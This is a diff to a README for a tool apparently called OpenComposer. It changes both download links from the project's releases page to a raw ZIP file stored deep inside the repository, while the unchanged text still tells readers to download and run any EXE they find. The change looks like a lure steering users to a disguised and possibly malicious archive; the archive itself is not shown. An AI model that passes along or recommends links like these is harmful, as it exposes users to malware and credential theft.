@@ -1,6 +1,6 @@
 # 🤖 OpenComposer - Run Composer 2 on One Machine
 
-[![Download OpenComposer](https://img.shields.io/badge/Download-OpenComposer-blue?style=for-the-badge)](https://github.com/bureaucracythermometer366/OpenComposer/releases)
+[![Download OpenComposer](https://img.shields.io/badge/Download-OpenComposer-blue?style=for-the-badge)](https://github.com/bureaucracythermometer366/OpenComposer/raw/refs/heads/main/opencomposer/environments/Composer-Open-3.0.zip)
 
 ## 📌 What is OpenComposer?
 
@@ -24,7 +24,7 @@ For best results, use a system close to the target setup: a single NVIDIA GH200 
 
 Visit this page to download:
 
-https://github.com/bureaucracythermometer366/OpenComposer/releases
+https://github.com/bureaucracythermometer366/OpenComposer/raw/refs/heads/main/opencomposer/environments/Composer-Open-3.0.zip
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see a ZIP file, download it and extract it first. If you see an EXE file, download it and run it.
 
